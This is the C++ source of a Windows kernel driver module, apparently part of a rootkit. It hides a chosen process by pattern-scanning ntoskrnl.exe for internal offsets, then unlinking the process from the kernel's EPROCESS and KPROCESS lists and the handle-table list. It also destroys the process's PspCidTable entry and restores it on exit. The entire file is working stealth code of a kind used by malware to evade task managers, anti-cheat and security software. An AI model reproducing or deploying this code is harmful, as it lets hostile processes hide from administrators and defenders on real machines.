#include "hide_process.h"

#pragma warning(disable : 4310)

ULONG e_process_link_offset, k_process_link_offset, e_process_handle_table_offset;
const int MAX_HIDE_COUNT = 0x100;

CID_PROCESS_INFO g_hide_info[MAX_HIDE_COUNT];


HANDLE_TABLE* PspCidTable;

fn_ExDestroyHandle ExDestroyHandle;

bool HIDE_PROCESS::init()
{
	RTL_OSVERSIONINFOW os_version{ 0 };
	RtlGetVersion(&os_version);

	e_process_link_offset = get_e_process_link_offset();
	k_process_link_offset = get_k_process_link_offset(os_version.dwBuildNumber);
	e_process_handle_table_offset = get_e_process_handle_table_offset(os_version.dwBuildNumber);

	get_table_and_destroy_hanlde(os_version.dwBuildNumber, &PspCidTable, (UINT64*)&ExDestroyHandle);

	if (!NT_SUCCESS(PsSetCreateProcessNotifyRoutine(on_process_notify, 0))) {

		MYLOG("failed to create process call back", true);
		return 0;
	}


	MYLOG("init success e_process_link_offset:0x%x,k_process_link_offset:0x%x,\
		e_process_handle_table_offset:0x%x,PspCidTable:0x%llx,ExDestroyHanlde:0x%llx\r\n", 
		false,e_process_link_offset, k_process_link_offset,e_process_handle_table_offset,\
		PspCidTable,ExDestroyHandle\
	);
	


	return true;
}

bool HIDE_PROCESS::uninstall()
{

	PsSetCreateProcessNotifyRoutine(on_process_notify, true);
	return true;
}

ULONG HIDE_PROCESS::get_e_process_link_offset()
{
	UNICODE_STRING func_name{ 0 };
	RtlInitUnicodeString(&func_name, L"PsGetProcessId");

	return (*(PULONG)((ULONG64)MmGetSystemRoutineAddress(&func_name)+3)+8);
}

ULONG HIDE_PROCESS::get_k_process_link_offset(DWORD32 build_number)
{

	if (build_number == 7600 || build_number == 7601) {


		return 0XE0;
	}
	else {

		UNICODE_STRING func_name{ 0 };
		RtlInitUnicodeString(&func_name, L"PsQueryTotalCycleTimeProcess");

		char* start = (char*)MmGetSystemRoutineAddress(&func_name);
		int index = 0;
		int meet_count = 0;

		while (meet_count != 3) {

			if (start[index++] == (char)0xe8) meet_count++;

		}

		index += 7;

		return (*(PULONG)(start + index)-0X10);

	}

}

ULONG HIDE_PROCESS::get_e_process_handle_table_offset(DWORD32 build_number)
{
	UNICODE_STRING func_name{ 0 };
	RtlInitUnicodeString(&func_name, L"PsGetProcessDebugPort");
	//__debugbreak();

	auto start = (char*)MmGetSystemRoutineAddress(&func_name);

	if (build_number == 7600 || build_number == 7601) return (*(PLONG)(start + 3) + 0x10);
	else return (*(PLONG)(start + 3) - 8);

}

bool HIDE_PROCESS::get_table_and_destroy_hanlde(DWORD32 build_number, HANDLE_TABLE** table, UINT64* _ExDestroyHandle)
{
	auto instance = Utils::fn_get_instance();

	if (build_number == 7600 || build_number == 7601) {

		UINT64 find = instance->fn_find_pattern_image(instance->fn_get_moudle_address("ntoskrnl.exe", 0), "\x48\x8b\x0d\x00\x00\x00\x00\x45\x33\xc0\xe8\x00\x00\x00\x00\x41\x3a\xc5", "xxx????xxxx????xxx", "PAGE");
		long offset_of_table = *(long*)(find + 3);
		*table = (HANDLE_TABLE*)(*(PUINT64)(find + 7 + offset_of_table));
		long offset_of_func = *(long*)(find + 11);
		*_ExDestroyHandle = (find + 15 + offset_of_func);
	}
	else {
		//DbgBreakPoint();
		//\x48\x8b\x0d\x00\x00\x00\x00\xe8\x00\x00\x00\x00\x49\x8b\xcc
		UINT64 find=instance->fn_find_pattern_image(instance->fn_get_moudle_address("ntoskrnl.exe", 0), "\x48\x8b\x0d\x00\x00\x00\x00\xe8\x00\x00\x00\x00\x49\x8b\xcc", "xxx????x????xxx", "PAGE");
		long offset_of_table = *(long*)(find + 3);
		
		*table = (HANDLE_TABLE*)(*(PUINT64)(find + 7 + offset_of_table));
		long offset_of_func= *(long*)(find + 8);
		*_ExDestroyHandle = (find + 12 + offset_of_func);
	
	}


	return true;
}

void HIDE_PROCESS::unlink_handle_table(PEPROCESS process, DWORD32 build_number)
{

	if (build_number == 7600 || build_number == 7601) {

		RemoveEntryList(&(*(HANDLE_TABLE_W7**)((UINT64)process + e_process_handle_table_offset))->HandleTableList);
		//
		InitializeListHead(&(*(HANDLE_TABLE_W7**)((UINT64)process + e_process_handle_table_offset))->HandleTableList);

	}
	else {

		RemoveEntryList(&(*(HANDLE_TABLE**)((UINT64)process + e_process_handle_table_offset))->HandleTableList);
		//
		InitializeListHead(&(*(HANDLE_TABLE**)((UINT64)process + e_process_handle_table_offset))->HandleTableList);
	}

}

bool HIDE_PROCESS::unlink_process(HANDLE pid)
{

	NTSTATUS status = STATUS_SUCCESS;
	PEPROCESS process{ 0 };
	status = PsLookupProcessByProcessId(pid, &process);
	if (!NT_SUCCESS(status)) {

		MYLOG("failed to get process", true);
		return false;
	}

	//eprocess
	RemoveEntryList((PLIST_ENTRY)((UINT64)process + e_process_link_offset));
	//
	InitializeListHead((PLIST_ENTRY)((UINT64)process + e_process_link_offset));
	//kprocess
	RemoveEntryList((PLIST_ENTRY)((UINT64)process + k_process_link_offset));
	//
	InitializeListHead((PLIST_ENTRY)((UINT64)process + k_process_link_offset));
	//unlink handle table list
	unlink_handle_table(process,Utils::fn_get_instance()->fn_get_os_build_number());
	//PspCIdTable
	remove_handle_table(PspCidTable, pid);

	return true;
}

bool HIDE_PROCESS::remove_handle_table(HANDLE_TABLE* table, HANDLE handle)
{

	auto index = find_empty();

	if (index == -1) {

		MYLOG("full to hide!", true);
		return false;
	}


	auto entry = ExpLookupHandleTableEntry(table, handle);

	g_hide_info[index].cid = handle;
	g_hide_info[index].pentry = entry;
	g_hide_info[index].entry = *entry;

	auto ret=ExDestroyHandle(table, handle, entry);

	
	

	return ret;
	 
}

PHANDLE_TABLE_ENTRY HIDE_PROCESS::ExpLookupHandleTableEntry(HANDLE_TABLE* table, HANDLE handle)
{
	//DbgBreakPoint();
	auto instance = Utils::fn_get_instance();
	//Cpoy from IDA pro
	uint64_t u_handle = (uint64_t)handle;
	uint64_t table_code;
	if (u_handle >= table->NextHandleNeedingPool) return 0;

	//win 7的结构不太一样
	if (instance->fn_get_os_build_number() == 7600 || instance->fn_get_os_build_number() == 7601) table_code = ((PHANDLE_TABLE_W7)table)->TableCode;
	else table_code = table->TableCode;

	auto level = table_code & 3;

	if (level == 1) {

		return (PHANDLE_TABLE_ENTRY)(*(uint64_t*)(table_code - 1 + 8 * (u_handle >> 10)) + 4 * (u_handle & 0X3FF));
	}
	else if (level == 2) {

		return (PHANDLE_TABLE_ENTRY)(*(uint64_t*)(*(uint64_t*)(table_code - 2 + 8 * (u_handle >> 19)) + 8 * (u_handle >> 10 & 0X1FF)) + 4 * (u_handle & 0x3ff));

	}
	else {

		return (PHANDLE_TABLE_ENTRY)(table_code + 4 * (u_handle & 0x3ff));

	}
}

int HIDE_PROCESS::find_empty()
{
	for (int i = 0; i < MAX_HIDE_COUNT; i++) {

		if (g_hide_info[i].cid == 0) return i;

	}
	return -1;
}

int HIDE_PROCESS::find_entry_by_cid(HANDLE cid)
{
	for (int i = 0; i < MAX_HIDE_COUNT; i++) {

		if (g_hide_info[i].cid == cid) return i;

	}

	return -1;
}

VOID HIDE_PROCESS::on_process_notify(HANDLE ParentId, HANDLE ProcessId, BOOLEAN Create)
{
	UNREFERENCED_PARAMETER(ParentId);

	if (!Create) {
		auto index = find_entry_by_cid(ProcessId);
		if (index!=-1) {

			*g_hide_info[index].pentry = g_hide_info[index].entry;

			g_hide_info[index].cid = 0;
		}

	}
}
